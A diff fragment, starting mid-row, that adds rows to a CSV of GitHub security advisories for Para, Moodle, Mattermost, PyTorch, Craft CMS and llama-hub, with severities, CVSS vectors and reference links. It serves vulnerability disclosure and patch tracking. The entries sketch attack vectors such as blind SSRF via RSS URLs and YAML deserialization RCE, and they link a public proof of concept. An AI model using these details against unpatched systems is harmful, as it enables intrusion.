+This exposes both access and secret keys in logs without redaction. These credentials are later reused in variable assignments for persistence but do not require logging for debugging or system health purposes.",medium,6.2,CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N,maven: com.erudika:para-server,2025-05-30T20:01:10Z,2025-05-30T20:01:10Z,https://github.com/Erudika/para/security/advisories/GHSA-v75g-77vf-6jjq; https://github.com/Erudika/para/commit/1e8a89558542854bb0683ab234c4429ad93b0835; https://github.com/advisories/GHSA-v75g-77vf-6jjq
+GHSA-vjxx-54vw-q59f,Moodle SSRF Vulnerability,"The `edit_blog.php` script allows a registered user to add external RSS feed resources. It was identified that this feature could be abused to be used as a SSRF attack vector by adding a malicious URL/TCP PORT in order to target internal network or an internet hosted server, bypassing firewall rules, IP filtering and more.
+
+This kind of vulnerability is then called “blind” because of no response available on Moodle web site, enforcing attacker to exploit it using a “time based” approach.",high,7.5,CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,composer: moodle/moodle,2022-05-14T01:17:52Z,2025-05-30T19:54:42Z,https://nvd.nist.gov/vuln/detail/CVE-2019-6970; https://cds.thalesgroup.com/en/tcs-cert/CVE-2019-6970; https://excellium-services.com/cert-xlm-advisory/cve-2019-6970; https://www.excellium-services.com/cert-xlm-advisory; https://www.excellium-services.com/cert-xlm-advisory/cve-2019-6970; https://github.com/advisories/GHSA-vjxx-54vw-q59f
+GHSA-86jg-35xj-3vv5,Mattermost fails to properly enforce access control restrictions for System Manager roles,"Mattermost versions 10.7.x <= 10.7.0, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fails to properly enforce access control restrictions for System Manager roles, allowing authenticated users with System Manager privileges to view team details they should not have access to via direct API requests to team endpoints, even when explicitly configured with 'No access' to Teams in the System Console.",low,3.1,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:34Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3611; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/6f33b721de76b39a7714bfe0d5e9c1306869a3e3; https://github.com/advisories/GHSA-86jg-35xj-3vv5
+GHSA-mc2f-jgj6-6cp3,Mattermost fails to properly invalidate personal access tokens upon user deactivation,"Mattermost versions 10.7.x <= 10.7.0, 10.6.x <= 10.6.2, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fails to properly invalidate personal access tokens upon user deactivation, allowing deactivated users to maintain full system access by exploiting access token validation flaws via continued usage of previously issued tokens.",medium,5.4,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:29Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3230; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/65343f84a7830fa8078fe3df879fca924e4fac01; https://github.com/advisories/GHSA-mc2f-jgj6-6cp3
+GHSA-8cgx-9ccj-3gwr,Mattermost fails to clear Google OAuth credentials,"Mattermost versions 10.7.x <= 10.7.0, 10.6.x <= 10.6.2, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fail to clear Google OAuth credentials when converting user accounts to bot accounts, allowing attackers to gain unauthorized access to bot accounts via the Google OAuth signup flow.",medium,4.2,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:24Z,https://nvd.nist.gov/vuln/detail/CVE-2025-2571; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/04676582cdd26f4fdfa78fcf60a7f8745e6b27f5; https://github.com/advisories/GHSA-8cgx-9ccj-3gwr
+GHSA-hc6v-386m-93pq,Mattermost fails to properly enforce access controls for guest users,"Mattermost versions 10.7.x <= 10.7.0, 10.5.x <= 10.5.3, 9.11.x <= 9.11.12 fail to properly enforce access controls for guest users accessing channel member information, allowing authenticated guest users to view metadata about members of public channels via the channel members API endpoint.",low,3.1,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N,go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8; go: github.com/mattermost/mattermost/server/v8,2025-05-30T15:30:32Z,2025-05-30T18:48:21Z,https://nvd.nist.gov/vuln/detail/CVE-2025-1792; https://mattermost.com/security-updates; https://github.com/mattermost/mattermost/commit/c23f44fe8ed02f71d506f99adc30ad34c58c89d1; https://github.com/advisories/GHSA-hc6v-386m-93pq
+GHSA-887c-mr87-cxwp,PyTorch Improper Resource Shutdown or Release vulnerability,"A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.",medium,3.3,CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L,pip: torch,2025-04-16T21:30:59Z,2025-05-30T17:13:52Z,https://nvd.nist.gov/vuln/detail/CVE-2025-3730; https://github.com/pytorch/pytorch/issues/150835; https://github.com/pytorch/pytorch/pull/150981; https://vuldb.com/?ctiid.305076; https://vuldb.com/?id.305076; https://vuldb.com/?submit.553645; https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af; https://github.com/timocafe/tewart-pytorch/commit/46fc5d8e360127361211cb237d5f9eef0223e567; https://github.com/advisories/GHSA-887c-mr87-cxwp
+GHSA-3749-ghw9-m3mg,PyTorch susceptible to local Denial of Service,"A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.",low,3.3,CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L,pip: torch,2025-03-30T18:30:24Z,2025-05-30T17:13:29Z,https://nvd.nist.gov/vuln/detail/CVE-2025-2953; https://github.com/pytorch/pytorch/issues/149274; https://github.com/pytorch/pytorch/issues/149274#issue-2923122269; https://vuldb.com/?ctiid.302006; https://vuldb.com/?id.302006; https://vuldb.com/?submit.521279; https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models; https://github.com/advisories/GHSA-3749-ghw9-m3mg
+GHSA-2p6p-9rc9-62j9,Craft CMS has potential RCE when PHP `register_argc_argv` config setting is enabled,"### Impact
+You are affected if your php.ini configuration has `register_argc_argv` enabled.
+
+### Patches
+Update to 3.9.14, 4.13.2, or 5.5.2.
+
+### Workarounds
+If you can't upgrade yet, and `register_argc_argv` is enabled, you can disable it to mitigate the issue.",critical,,,composer: craftcms/cms; composer: craftcms/cms; composer: craftcms/cms,2024-12-18T19:47:26Z,2025-05-30T16:41:54Z,https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9; https://github.com/craftcms/cms/commit/82e893fb794d30563da296bca31379c0df0079b3; https://nvd.nist.gov/vuln/detail/CVE-2024-56145; https://github.com/Chocapikk/CVE-2024-56145; https://github.com/advisories/GHSA-2p6p-9rc9-62j9
+GHSA-297x-2qf3-jrj3,Unsafe yaml deserialization in llama-hub,The OpenAPI and ChatGPT plugin loaders in LlamaHub (aka llama-hub) before 0.0.67 allow attackers to execute arbitrary code because safe_load is not used for YAML.,critical,9.8,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,pip: llama-hub,2024-01-21T18:30:34Z,2025-05-30T16:31:58Z,https://nvd.nist.gov/vuln/detail/CVE-2024-23730; https://github.com/run-llama/llama-hub/blob/v0.0.67/CHANGELOG.md; https://github.com/run-llama/llama-hub/releases/tag/v0.0.67; https://github.com/run-llama/llama-hub/commit/c01416e737c7747a213a79881b8308c41d043515; https://github.com/run-llama/llama-hub/pull/841/commits/9dc9c21a5c6d0226d1d2101c3121d4f085743d52; https://github.com/advisories/GHSA-297x-2qf3-jrj3
